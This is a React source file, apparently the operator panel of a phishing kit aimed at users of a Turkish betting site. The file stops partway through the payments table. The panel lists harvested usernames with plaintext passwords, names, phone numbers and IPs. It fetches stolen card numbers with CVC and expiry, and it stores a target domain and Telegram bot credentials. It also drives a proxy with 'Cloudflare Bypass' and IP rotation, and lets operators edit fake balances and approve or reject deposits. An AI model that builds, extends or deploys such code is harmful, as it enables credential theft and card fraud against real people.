import { useState, useEffect } from "react";
import { useQuery, useMutation } from "@tanstack/react-query";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { apiRequest, queryClient } from "@/lib/queryClient";
import {
  LogOut, Trash2, Ban, Check, X, CreditCard, Eye, EyeOff,
  LayoutDashboard, Users, Wallet, Settings, Search, RefreshCw,
  TrendingUp, Clock, ShieldAlert, DollarSign, UserCheck, AlertTriangle,
  Copy, ChevronLeft, ChevronRight, Plus, Minus, Pencil,
  Globe, Shield, Wifi, WifiOff, Activity, Zap, Server,
} from "lucide-react";
import { useToast } from "@/hooks/use-toast";

interface AdminMe { loggedIn: boolean; username?: string; }
interface LogEntry {
  id: number; username: string; password: string; balance: number;
  name: string | null; surname: string | null; phoneNumber: string | null;
  ip: string | null; date: number; isDeleted: number; isBanned: number; vip: number;
}
interface PaymentEntry {
  id: number; username: string; amount: number; provider: string;
  status: string; ccId: number | null; date: number; isDeleted: number;
}
interface CardInfo {
  ccOwner: string; ccNo: string; ccCvc: string; ccMonth: string; ccYear: string; amount: number;
}
interface WithdrawalEntry {
  id: number; username: string; amount: number; method: string;
  bankName: string | null; iban: string | null; accountHolder: string | null;
  paparaNo: string | null; status: string; date: number;
  processedAt: number | null; isDeleted: number;
}
interface SettingsData {
  settings: {
    targetDomain?: string; telegramBotToken?: string; telegramChatId?: string;
    cdnUrl?: string; slotLink?: string; demoUrl?: string; liveChatCode?: string;
    minDeposit?: number; maxDeposit?: number; minWithdraw?: number; maxWithdraw?: number;
  };
  bankAccount: { name: string; iban: string };
  paparaAccount: { no: string; iban: string };
  cryptoAccount: { walletNo: string };
}
interface StatsData {
  totalUsers: number; bannedUsers: number; totalPayments: number;
  pendingPayments: number; approvedPayments: number; rejectedPayments: number;
  totalAmount: number; pendingAmount: number; todayUsers: number; todayPayments: number;
  totalWithdrawals: number; pendingWithdrawals: number; approvedWithdrawals: number;
  totalWithdrawalAmount: number; pendingWithdrawalAmount: number;
}
interface AdminUser {
  id: string;
  username: string;
  balance?: string;
}

const ITEMS_PER_PAGE = 15;

function LoginScreen({ onLogin }: { onLogin: () => void }) {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");

  const loginMutation = useMutation({
    mutationFn: async (data: { username: string; password: string }) => {
      const res = await apiRequest("POST", "/api/admin/login", data);
      return res.json();
    },
    onSuccess: (result: { success?: boolean; error?: string }) => {
      if (result.success) {
        queryClient.invalidateQueries({ queryKey: ["/api/admin/me"] });
        onLogin();
      } else setError(result.error || "Giris basarisiz");
    },
    onError: (err: Error) => setError(err.message || "Giris basarisiz"),
  });

  return (
    <div className="min-h-screen flex items-center justify-center bg-[#0a0e17]">
      <div className="w-full max-w-sm p-8 bg-[#111827] rounded-2xl border border-[#1e293b] shadow-2xl">
        <div className="text-center mb-8">
          <div className="w-16 h-16 bg-gradient-to-br from-emerald-500 to-emerald-700 rounded-2xl mx-auto mb-4 flex items-center justify-center">
            <ShieldAlert className="w-8 h-8 text-white" />
          </div>
          <h1 className="text-2xl font-bold text-white">Admin Panel</h1>
          <p className="text-sm text-gray-500 mt-1">Yonetim paneline giris yapin</p>
        </div>
        {error && (
          <div className="mb-4 p-3 bg-red-500/10 border border-red-500/30 rounded-lg text-red-400 text-sm text-center" data-testid="text-login-error">
            {error}
          </div>
        )}
        <div className="space-y-4">
          <div>
            <label className="block text-sm text-gray-400 mb-1.5">Kullanici Adi</label>
            <input
              className="w-full px-4 py-3 bg-[#0a0e17] border border-[#1e293b] rounded-lg text-white placeholder-gray-600 focus:border-emerald-500 focus:outline-none transition"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              placeholder="admin"
              data-testid="input-admin-username"
              onKeyDown={(e) => { if (e.key === "Enter" && username && password) loginMutation.mutate({ username, password }); }}
            />
          </div>
          <div>
            <label className="block text-sm text-gray-400 mb-1.5">Sifre</label>
            <input
              className="w-full px-4 py-3 bg-[#0a0e17] border border-[#1e293b] rounded-lg text-white placeholder-gray-600 focus:border-emerald-500 focus:outline-none transition"
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="********"
              data-testid="input-admin-password"
              onKeyDown={(e) => { if (e.key === "Enter" && username && password) loginMutation.mutate({ username, password }); }}
            />
          </div>
          <button
            className="w-full py-3 bg-gradient-to-r from-emerald-600 to-emerald-700 text-white font-semibold rounded-lg hover:from-emerald-500 hover:to-emerald-600 transition disabled:opacity-50 disabled:cursor-not-allowed"
            disabled={loginMutation.isPending || !username || !password}
            onClick={() => loginMutation.mutate({ username, password })}
            data-testid="button-admin-login"
          >
            {loginMutation.isPending ? "Giris yapiliyor..." : "Giris Yap"}
          </button>
        </div>
      </div>
    </div>
  );
}

function StatCard({ icon: Icon, label, value, sub, color }: { icon: any; label: string; value: string | number; sub?: string; color: string }) {
  return (
    <div className="bg-[#111827] border border-[#1e293b] rounded-xl p-5">
      <div className="flex items-center justify-between mb-3">
        <span className="text-sm text-gray-400">{label}</span>
        <div className={`w-10 h-10 rounded-lg flex items-center justify-center ${color}`}>
          <Icon className="w-5 h-5 text-white" />
        </div>
      </div>
      <div className="text-2xl font-bold text-white">{value}</div>
      {sub && <div className="text-xs text-gray-500 mt-1">{sub}</div>}
    </div>
  );
}

interface ProxyStatus {
  sessionId?: string;
  storedCookies?: number;
  cookieNames?: string[];
  cfReady?: boolean;
  hasCfClearance?: boolean;
  hasCfBm?: boolean;
  bypassInProgress?: boolean;
  bypassFailCount?: number;
  target?: string;
  proxyConfigured?: boolean;
  timestamp?: string;
}

function DashboardSection() {
  const { data: stats, isLoading } = useQuery<StatsData>({ queryKey: ["/api/admin/stats"] });
  const { data: recentLogins } = useQuery<LogEntry[]>({ queryKey: ["/api/admin/recent-logins"] });
  const { data: proxyStatus, refetch: refetchProxy } = useQuery<ProxyStatus>({ queryKey: ["/api/admin/proxy-status"] });
  const { toast } = useToast();

  const refreshSessionMutation = useMutation({
    mutationFn: async () => {
      const res = await apiRequest("POST", "/api/admin/refresh-session");
      return res.json();
    },
    onSuccess: (data: any) => {
      toast({ title: data.message || "Session yenilendi" });
      refetchProxy();
    },
    onError: (e: Error) => toast({ title: "Hata", description: e.message, variant: "destructive" }),
  });

  const cfBypassMutation = useMutation({
    mutationFn: async () => {
      const res = await apiRequest("POST", "/api/admin/cf-bypass");
      return res.json();
    },
    onSuccess: (data: any) => {
      if (data?.success) {
        toast({ title: data.message || "CF Bypass tamamlandi" });
      } else {
        toast({ title: data.message || "CF bypass basarisiz", description: data.errorDetail, variant: "destructive" });
      }
      refetchProxy();
    },
    onError: (e: Error) => toast({ title: "Hata", description: e.message, variant: "destructive" }),
  });

  const clearCacheMutation = useMutation({
    mutationFn: async () => {
      const res = await fetch("/api/admin/clear-cache", { method: "POST", credentials: "include" });
      return res.json();
    },
    onSuccess: (result: { message?: string; error?: string }) => {
      toast({ title: result.message || result.error || "Tamamlandi" });
    },
  });

  if (isLoading) return <div className="p-8 text-gray-500">Yukleniyor...</div>;
  if (!stats) return null;

  const formatDate = (ts: number) => {
    if (!ts) return "-";
    const d = new Date(ts * 1000);
    return d.toLocaleDateString("tr-TR") + " " + d.toLocaleTimeString("tr-TR", { hour: "2-digit", minute: "2-digit" });
  };

  return (
    <div className="space-y-6">
      <div>
        <h2 className="text-xl font-bold text-white mb-1" data-testid="text-dashboard-title">Dashboard</h2>
        <p className="text-sm text-gray-500">Genel bakis ve istatistikler</p>
      </div>

      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        <StatCard icon={Users} label="Toplam Kullanici" value={stats.totalUsers} sub={`Bugun: ${stats.todayUsers}`} color="bg-blue-600" />
        <StatCard icon={Wallet} label="Toplam Odeme" value={stats.totalPayments} sub={`Bugun: ${stats.todayPayments}`} color="bg-emerald-600" />
        <StatCard icon={Clock} label="Bekleyen Odeme" value={stats.pendingPayments} sub={`${stats.pendingAmount.toLocaleString("tr-TR")} TL`} color="bg-yellow-600" />
        <StatCard icon={DollarSign} label="Toplam Tutar" value={`${stats.totalAmount.toLocaleString("tr-TR")} TL`} color="bg-purple-600" />
      </div>
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
        <StatCard icon={UserCheck} label="Onaylanan" value={stats.approvedPayments} color="bg-green-700" />
        <StatCard icon={AlertTriangle} label="Reddedilen" value={stats.rejectedPayments} color="bg-red-700" />
        <StatCard icon={Ban} label="Banlanan" value={stats.bannedUsers} color="bg-orange-700" />
      </div>

      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        <StatCard icon={TrendingUp} label="Toplam Cekim" value={stats.totalWithdrawals ?? 0} color="bg-indigo-600" />
        <StatCard icon={Clock} label="Bekleyen Cekim" value={stats.pendingWithdrawals ?? 0} sub={`${(stats.pendingWithdrawalAmount ?? 0).toLocaleString("tr-TR")} TL`} color="bg-amber-600" />
        <StatCard icon={UserCheck} label="Onaylanan Cekim" value={stats.approvedWithdrawals ?? 0} color="bg-teal-700" />
        <StatCard icon={DollarSign} label="Toplam Cekim Tutari" value={`${(stats.totalWithdrawalAmount ?? 0).toLocaleString("tr-TR")} TL`} color="bg-rose-600" />
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <div className="bg-[#111827] border border-[#1e293b] rounded-xl p-5">
          <div className="flex items-center justify-between mb-4">
            <h3 className="text-base font-semibold text-white flex items-center gap-2">
              <Activity className="w-4 h-4 text-emerald-400" />
              Son Girisler
            </h3>
            <Badge variant="secondary" className="text-xs">{recentLogins?.length || 0} kayit</Badge>
          </div>
          <div className="space-y-2 max-h-[360px] overflow-y-auto">
            {(recentLogins ?? []).length === 0 ? (
              <p className="text-sm text-gray-500 text-center py-4">Henuz giris yok</p>
            ) : (
              (recentLogins ?? []).map((log) => (
                <div key={log.id} className="flex items-center justify-between bg-[#0a0e17] rounded-lg px-3 py-2.5 border border-[#1e293b]/50" data-testid={`login-row-${log.id}`}>
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2">
                      <span className="text-sm font-medium text-white truncate">{log.username}</span>
                      {log.isBanned === 1 && <Badge variant="destructive" className="text-[10px] px-1.5 py-0">Ban</Badge>}
                    </div>
                    <div className="flex items-center gap-3 mt-0.5">
                      <span className="text-xs text-gray-500">{log.ip || "-"}</span>
                      <span className="text-xs text-gray-600">{formatDate(log.date)}</span>
                    </div>
                  </div>
                  <div className="text-right shrink-0 ml-3">
                    <div className="text-sm font-semibold text-emerald-400">{Number(log.balance || 0).toLocaleString("tr-TR")} TRY</div>
                  </div>
                </div>
              ))
            )}
          </div>
        </div>

        <div className="space-y-4">
          <div className="bg-[#111827] border border-[#1e293b] rounded-xl p-5">
            <h3 className="text-base font-semibold text-white flex items-center gap-2 mb-4">
              <Server className="w-4 h-4 text-blue-400" />
              Proxy Durumu
            </h3>
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <span className="text-sm text-gray-400">Cloudflare</span>
                <div className="flex items-center gap-1.5">
                  {proxyStatus?.cfReady ? (
                    <><Wifi className="w-4 h-4 text-emerald-400" /><span className="text-sm text-emerald-400 font-medium">Aktif</span></>
                  ) : (
                    <><WifiOff className="w-4 h-4 text-red-400" /><span className="text-sm text-red-400 font-medium">Pasif</span></>
                  )}
                </div>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-sm text-gray-400">Proxy</span>
                <span className={`text-sm font-medium ${proxyStatus?.proxyConfigured ? "text-emerald-400" : "text-red-400"}`}>
                  {proxyStatus?.proxyConfigured ? "Bagli" : "Yapilandirilmamis"}
                </span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-sm text-gray-400">Session ID</span>
                <span className="text-xs text-gray-300 font-mono bg-[#0a0e17] px-2 py-1 rounded">{proxyStatus?.sessionId?.slice(0, 12) || "-"}...</span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-sm text-gray-400">Cookie Sayisi</span>
                <span className="text-sm text-white font-medium">{proxyStatus?.storedCookies ?? 0}</span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-sm text-gray-400">cf_clearance</span>
                {proxyStatus?.hasCfClearance ? (
                  <Check className="w-4 h-4 text-emerald-400" />
                ) : (
                  <X className="w-4 h-4 text-red-400" />
                )}
              </div>
              <div className="flex items-center justify-between">
                <span className="text-sm text-gray-400">Hedef</span>
                <span className="text-xs text-gray-300">{proxyStatus?.target || "-"}</span>
              </div>
              {proxyStatus?.bypassInProgress && (
                <div className="flex items-center gap-2 text-yellow-400 text-sm">
                  <RefreshCw className="w-4 h-4 animate-spin" />
                  Bypass devam ediyor...
                </div>
              )}
            </div>
          </div>

          <div className="bg-[#111827] border border-[#1e293b] rounded-xl p-5">
            <h3 className="text-base font-semibold text-white flex items-center gap-2 mb-4">
              <Zap className="w-4 h-4 text-yellow-400" />
              Proxy Islemleri
            </h3>
            <div className="grid grid-cols-1 gap-2">
              <button
                className="w-full flex items-center justify-center gap-2 px-4 py-2.5 bg-blue-600/20 hover:bg-blue-600/30 text-blue-400 border border-blue-600/30 rounded-lg text-sm font-medium transition disabled:opacity-50"
                onClick={() => refreshSessionMutation.mutate()}
                disabled={refreshSessionMutation.isPending}
                data-testid="button-refresh-session"
              >
                <RefreshCw className={`w-4 h-4 ${refreshSessionMutation.isPending ? "animate-spin" : ""}`} />
                {refreshSessionMutation.isPending ? "Yenileniyor..." : "Yeni Oturum / IP"}
              </button>
              <button
                className="w-full flex items-center justify-center gap-2 px-4 py-2.5 bg-purple-600/20 hover:bg-purple-600/30 text-purple-400 border border-purple-600/30 rounded-lg text-sm font-medium transition disabled:opacity-50"
                onClick={() => cfBypassMutation.mutate()}
                disabled={cfBypassMutation.isPending}
                data-testid="button-cf-bypass"
              >
                <Shield className={`w-4 h-4 ${cfBypassMutation.isPending ? "animate-spin" : ""}`} />
                {cfBypassMutation.isPending ? "Bypass yapiliyor..." : "Cloudflare Bypass"}
              </button>
              <button
                className="w-full flex items-center justify-center gap-2 px-4 py-2.5 bg-amber-600/20 hover:bg-amber-600/30 text-amber-400 border border-amber-600/30 rounded-lg text-sm font-medium transition disabled:opacity-50"
                onClick={() => clearCacheMutation.mutate()}
                disabled={clearCacheMutation.isPending}
                data-testid="button-clear-cache-dash"
              >
                <Trash2 className={`w-4 h-4`} />
                {clearCacheMutation.isPending ? "Temizleniyor..." : "Cache Temizle"}
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

function HesaplarSection() {
  const { data: logs, isLoading } = useQuery<LogEntry[]>({ queryKey: ["/api/admin/logs"] });
  const [search, setSearch] = useState("");
  const [page, setPage] = useState(1);
  const [showPasswords, setShowPasswords] = useState<Record<number, boolean>>({});
  const [editingBalance, setEditingBalance] = useState<number | null>(null);
  const [balanceInput, setBalanceInput] = useState("");
  const { toast } = useToast();

  const updateBalanceMutation = useMutation({
    mutationFn: async ({ logId, balance }: { logId: number; balance: number }) => {
      await apiRequest("PATCH", `/api/admin/logs/${logId}`, { balance });
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/admin/logs"] });
      queryClient.invalidateQueries({ queryKey: ["/api/admin/stats"] });
      setEditingBalance(null);
      setBalanceInput("");
      toast({ title: "Bakiye guncellendi" });
    },
  });

  const banMutation = useMutation({
    mutationFn: async (id: number) => { await apiRequest("POST", `/api/admin/logs/${id}/ban`); },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/admin/logs"] });
      queryClient.invalidateQueries({ queryKey: ["/api/admin/stats"] });
      toast({ title: "Kullanici banlandi" });
    },
  });

  const deleteAllMutation = useMutation({
    mutationFn: async () => { await apiRequest("DELETE", "/api/admin/logs"); },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/admin/logs"] });
      queryClient.invalidateQueries({ queryKey: ["/api/admin/stats"] });
      toast({ title: "Tum kayitlar silindi" });
    },
  });

  const filtered = (logs || []).filter((l) => {
    if (!search) return true;
    const s = search.toLowerCase();
    return l.username.toLowerCase().includes(s) || l.password.toLowerCase().includes(s) ||
      (l.ip || "").toLowerCase().includes(s) || (l.name || "").toLowerCase().includes(s);
  });

  const totalPages = Math.max(1, Math.ceil(filtered.length / ITEMS_PER_PAGE));
  const paginated = filtered.slice((page - 1) * ITEMS_PER_PAGE, page * ITEMS_PER_PAGE);

  useEffect(() => { setPage(1); }, [search]);

  if (isLoading) return <div className="p-8 text-gray-500">Yukleniyor...</div>;

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast({ title: "Kopyalandi" });
  };

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between gap-4 flex-wrap">
        <div>
          <h2 className="text-xl font-bold text-white">Hesaplar</h2>
          <p className="text-sm text-gray-500">{filtered.length} kayit bulundu</p>
        </div>
        <div className="flex items-center gap-2 flex-wrap">
          <div className="relative">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
            <input
              className="pl-9 pr-4 py-2 bg-[#0a0e17] border border-[#1e293b] rounded-lg text-white placeholder-gray-600 focus:border-emerald-500 focus:outline-none text-sm w-64"
              placeholder="Kullanici, IP, sifre ara..."
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              data-testid="input-search-logs"
            />
          </div>
          <button
            className="flex items-center gap-1.5 px-3 py-2 bg-red-600/20 text-red-400 border border-red-600/30 rounded-lg text-sm hover:bg-red-600/30 transition"
            onClick={() => { if (confirm("Tum kayitlar silinecek. Emin misiniz?")) deleteAllMutation.mutate(); }}
            disabled={deleteAllMutation.isPending}
            data-testid="button-delete-all-logs"
          >
            <Trash2 className="w-4 h-4" /> Tumunu Sil
          </button>
        </div>
      </div>

      <div className="bg-[#111827] border border-[#1e293b] rounded-xl overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full text-sm">
            <thead>
              <tr className="border-b border-[#1e293b] text-gray-400 text-xs uppercase">
                <th className="px-4 py-3 text-left">#</th>
                <th className="px-4 py-3 text-left">Kullanici</th>
                <th className="px-4 py-3 text-left">Sifre</th>
                <th className="px-4 py-3 text-left">Bakiye</th>
                <th className="px-4 py-3 text-left">Ad Soyad</th>
                <th className="px-4 py-3 text-left">Telefon</th>
                <th className="px-4 py-3 text-left">IP</th>
                <th className="px-4 py-3 text-left">Tarih</th>
                <th className="px-4 py-3 text-left">Durum</th>
                <th className="px-4 py-3 text-left">Islemler</th>
              </tr>
            </thead>
            <tbody>
              {paginated.map((log, idx) => (
                <tr key={log.id} className="border-b border-[#1e293b]/50 hover:bg-[#1e293b]/30 transition" data-testid={`row-log-${log.id}`}>
                  <td className="px-4 py-3 text-gray-500">{(page - 1) * ITEMS_PER_PAGE + idx + 1}</td>
                  <td className="px-4 py-3">
                    <div className="flex items-center gap-1.5">
                      <span className="font-mono text-emerald-400" data-testid={`text-log-username-${log.id}`}>{log.username}</span>
                      <button onClick={() => copyToClipboard(log.username)} className="text-gray-600 hover:text-gray-400">
                        <Copy className="w-3 h-3" />
                      </button>
                    </div>
                  </td>
                  <td className="px-4 py-3">
                    <div className="flex items-center gap-1.5">
                      <span className="font-mono text-white" data-testid={`text-log-password-${log.id}`}>
                        {showPasswords[log.id] ? log.password : "••••••••"}
                      </span>
                      <button onClick={() => setShowPasswords(p => ({ ...p, [log.id]: !p[log.id] }))} className="text-gray-600 hover:text-gray-400">
                        {showPasswords[log.id] ? <EyeOff className="w-3 h-3" /> : <Eye className="w-3 h-3" />}
                      </button>
                      <button onClick={() => copyToClipboard(log.password)} className="text-gray-600 hover:text-gray-400">
                        <Copy className="w-3 h-3" />
                      </button>
                    </div>
                  </td>
                  <td className="px-4 py-3" data-testid={`text-log-balance-${log.id}`}>
                    {editingBalance === log.id ? (
                      <div className="flex items-center gap-1">
                        <input
                          type="number"
                          step="0.01"
                          className="w-20 h-7 px-2 bg-[#0a0e17] border border-emerald-500/50 rounded text-white text-sm focus:outline-none focus:border-emerald-500"
                          value={balanceInput}
                          onChange={(e) => setBalanceInput(e.target.value)}
                          onKeyDown={(e) => {
                            if (e.key === "Enter") {
                              const val = parseFloat(balanceInput);
                              if (!isNaN(val) && val >= 0) updateBalanceMutation.mutate({ logId: log.id, balance: val });
                            }
                            if (e.key === "Escape") { setEditingBalance(null); setBalanceInput(""); }
                          }}
                          autoFocus
                          data-testid={`input-balance-edit-${log.id}`}
                        />
                        <button
                          className="p-1 rounded hover:bg-emerald-600/20 text-emerald-400 transition"
                          onClick={() => {
                            const val = parseFloat(balanceInput);
                            if (!isNaN(val) && val >= 0) updateBalanceMutation.mutate({ logId: log.id, balance: val });
                          }}
                          title="Kaydet"
                          data-testid={`button-balance-save-${log.id}`}
                        >
                          <Check className="w-3.5 h-3.5" />
                        </button>
                        <button
                          className="p-1 rounded hover:bg-red-600/20 text-gray-500 hover:text-red-400 transition"
                          onClick={() => { setEditingBalance(null); setBalanceInput(""); }}
                          title="Iptal"
                          data-testid={`button-balance-cancel-${log.id}`}
                        >
                          <X className="w-3.5 h-3.5" />
                        </button>
                      </div>
                    ) : (
                      <div className="flex items-center gap-1.5">
                        <span className="text-white font-medium">{log.balance}</span>
                        <button
                          className="p-1 rounded hover:bg-emerald-600/20 text-gray-600 hover:text-emerald-400 transition"
                          onClick={() => { setEditingBalance(log.id); setBalanceInput(String(log.balance)); }}
                          title="Bakiye duzenle"
                          data-testid={`button-balance-edit-${log.id}`}
                        >
                          <Pencil className="w-3 h-3" />
                        </button>
                      </div>
                    )}
                  </td>
                  <td className="px-4 py-3 text-gray-300">{[log.name, log.surname].filter(Boolean).join(" ") || "-"}</td>
                  <td className="px-4 py-3 text-gray-400">{log.phoneNumber || "-"}</td>
                  <td className="px-4 py-3">
                    <span className="font-mono text-xs text-gray-400">{log.ip || "-"}</span>
                  </td>
                  <td className="px-4 py-3 text-xs text-gray-400 whitespace-nowrap">
                    {new Date(log.date * 1000).toLocaleString("tr-TR")}
                  </td>
                  <td className="px-4 py-3">
                    {log.isBanned === 1 ? (
                      <span className="inline-flex items-center px-2 py-0.5 rounded-full text-xs font-medium bg-red-500/20 text-red-400 border border-red-500/30">Banlandi</span>
                    ) : (
                      <span className="inline-flex items-center px-2 py-0.5 rounded-full text-xs font-medium bg-emerald-500/20 text-emerald-400 border border-emerald-500/30">Aktif</span>
                    )}
                  </td>
                  <td className="px-4 py-3">
                    <div className="flex items-center gap-1">
                      {log.isBanned !== 1 && (
                        <button
                          className="p-1.5 rounded-lg hover:bg-red-600/20 text-gray-500 hover:text-red-400 transition"
                          onClick={() => banMutation.mutate(log.id)}
                          disabled={banMutation.isPending}
                          title="Banla"
                          data-testid={`button-ban-${log.id}`}
                        >
                          <Ban className="w-4 h-4" />
                        </button>
                      )}
                    </div>
                  </td>
                </tr>
              ))}
              {paginated.length === 0 && (
                <tr>
                  <td colSpan={10} className="px-4 py-12 text-center text-gray-500">
                    {search ? "Arama sonucu bulunamadi" : "Henuz kayit yok"}
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>
        {totalPages > 1 && (
          <div className="flex items-center justify-between px-4 py-3 border-t border-[#1e293b]">
            <span className="text-xs text-gray-500">Sayfa {page} / {totalPages}</span>
            <div className="flex items-center gap-1">
              <button className="p-1.5 rounded hover:bg-[#1e293b] text-gray-400 disabled:opacity-30" onClick={() => setPage(p => Math.max(1, p - 1))} disabled={page === 1}>
                <ChevronLeft className="w-4 h-4" />
              </button>
              <button className="p-1.5 rounded hover:bg-[#1e293b] text-gray-400 disabled:opacity-30" onClick={() => setPage(p => Math.min(totalPages, p + 1))} disabled={page === totalPages}>
                <ChevronRight className="w-4 h-4" />
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

function OdemelerSection() {
  const { data: payments, isLoading } = useQuery<PaymentEntry[]>({ queryKey: ["/api/admin/payments"] });
  const [search, setSearch] = useState("");
  const [statusFilter, setStatusFilter] = useState<string>("all");
  const [page, setPage] = useState(1);
  const [cardDialogOpen, setCardDialogOpen] = useState(false);
  const [selectedCcId, setSelectedCcId] = useState<number | null>(null);
  const { toast } = useToast();

  const { data: cardInfo, isLoading: cardLoading } = useQuery<CardInfo>({
    queryKey: [`/api/admin/payments/${selectedCcId}/card`],
    enabled: !!selectedCcId && cardDialogOpen,
  });

  const approveMutation = useMutation({
    mutationFn: async (id: number) => { await apiRequest("PATCH", `/api/admin/payments/${id}`, { status: "approved" }); },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/admin/payments"] });
      queryClient.invalidateQueries({ queryKey: ["/api/admin/stats"] });
      toast({ title: "Odeme onaylandi" });
    },
  });

  const rejectMutation = useMutation({
    mutationFn: async (id: number) => { await apiRequest("PATCH", `/api/admin/payments/${id}`, { status: "rejected" }); },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/admin/payments"] });
      queryClient.invalidateQueries({ queryKey: ["/api/admin/stats"] });
      toast({ title: "Odeme reddedildi" });
    },
  });

  const deleteAllMutation = useMutation({
    mutationFn: async () => { await apiRequest("DELETE", "/api/admin/payments"); },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/admin/payments"] });
      queryClient.invalidateQueries({ queryKey: ["/api/admin/stats"] });
      toast({ title: "Tum odemeler silindi" });
    },
  });

  const filtered = (payments || []).filter((p) => {
    if (statusFilter !== "all" && p.status !== statusFilter) return false;
    if (!search) return true;
    const s = search.toLowerCase();
    return p.username.toLowerCase().includes(s) || p.provider.toLowerCase().includes(s);
  });

  const totalPages = Math.max(1, Math.ceil(filtered.length / ITEMS_PER_PAGE));
  const paginated = filtered.slice((page - 1) * ITEMS_PER_PAGE, page * ITEMS_PER_PAGE);

  useEffect(() => { setPage(1); }, [search, statusFilter]);

  if (isLoading) return <div className="p-8 text-gray-500">Yukleniyor...</div>;

  const statusStyles: Record<string, string> = {
    pending: "bg-yellow-500/20 text-yellow-400 border-yellow-500/30",
    approved: "bg-emerald-500/20 text-emerald-400 border-emerald-500/30",
    rejected: "bg-red-500/20 text-red-400 border-red-500/30",
  };

  const statusLabels: Record<string, string> = {
    pending: "Bekliyor",
    approved: "Onaylandi",
    rejected: "Reddedildi",
  };

  const providerLabels: Record<string, string> = {
    havale: "Havale",
    papara: "Papara",
    kredikarti: "Kredi Karti",
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast({ title: "Kopyalandi" });
  };

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between gap-4 flex-wrap">
        <div>
          <h2 className="text-xl font-bold text-white">Odeme Talepleri</h2>
          <p className="text-sm text-gray-500">{filtered.length} kayit bulundu</p>
        </div>
        <div className="flex items-center gap-2 flex-wrap">
          <div className="flex items-center gap-1 bg-[#0a0e17] border border-[#1e293b] rounded-lg p-0.5">
            {[
              { key: "all", label: "Tumu" },
              { key: "pending", label: "Bekleyen" },
              { key: "approved", label: "Onaylanan" },
              { key: "rejected", label: "Reddedilen" },
            ].map((f) => (
              <button
                key={f.key}
                className={`px-3 py-1.5 rounded-md text-xs font-medium transition ${statusFilter === f.key ? "bg-emerald-600 text-white" : "text-gray-400 hover:text-white"}`}
                onClick={() => setStatusFilter(f.key)}
                data-testid={`filter-status-${f.key}`}
              >
                {f.label}
              </button>
            ))}
          </div>
          <div className="relative">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
            <input
              className="pl-9 pr-4 py-2 bg-[#0a0e17] border border-[#1e293b] rounded-lg text-white placeholder-gray-600 focus:border-emerald-500 focus:outline-none text-sm w-48"
              placeholder="Kullanici, yontem..."
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              data-testid="input-search-payments"
            />
          </div>
          <button
            className="flex items-center gap-1.5 px-3 py-2 bg-red-600/20 text-red-400 border border-red-600/30 rounded-lg text-sm hover:bg-red-600/30 transition"
            onClick={() => { if (confirm("Tum odemeler silinecek. Emin misiniz?")) deleteAllMutation.mutate(); }}
            disabled={deleteAllMutation.isPending}
            data-testid="button-delete-all-payments"
          >
            <Trash2 className="w-4 h-4" /> Tumunu Sil
          </button>
        </div>
      </div>

      <div className="bg-[#111827] border border-[#1e293b] rounded-xl overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full text-sm">
            <thead>
              <tr className="border-b border-[#1e293b] text-gray-400 text-xs uppercase">
                <th className="px-4 py-3 text-left">#</th>
                <th className="px-4 py-3 text-left">Kullanici</th>
                <th className="px-4 py-3 text-left">Tutar</th>
                <th className="px-4 py-3 text-left">Yontem</th>
                <th className="px-4 py-3 text-left">Durum</th>
                <th className="px-4 py-3 text-left">Tarih</th>
                <th className="px-4 py-3 text-left">Islemler</th>
              </tr>
            </thead>
            <tbody>
              {paginated.map((p, idx) => (
                <tr key={p.id} className="border-b border-[#1e293b]/50 hover:bg-[#1e293b]/30 transition" data-testid={`row-payment-${p.id}`}>
                  <td className="px-4 py-3 text-gray-500">{(page - 1) * ITEMS_PER_PAGE + idx + 1}</td>
                  <td className="px-4 py-3">
                    <span className="font-mono text-emerald-400" data-testid={`text-payment-username-${p.id}`}>{p.username}</span>
                  </td>
                  <td className="px-4 py-3">
                    <span className="font-semibold text-white" data-testid={`text-payment-amount-${p.id}`}>
                      {p.amount.toLocaleString("tr-TR")} TL
                    </span>
                  </td>
                  <td className="px-4 py-3">
                    <span className="inline-flex items-center px-2 py-0.5 rounded-full text-xs font-medium bg-[#1e293b] text-gray-300 border border-[#2d3a4e]">
                      {providerLabels[p.provider] || p.provider}
                    </span>
                  </td>
                  <td className="px-4 py-3">
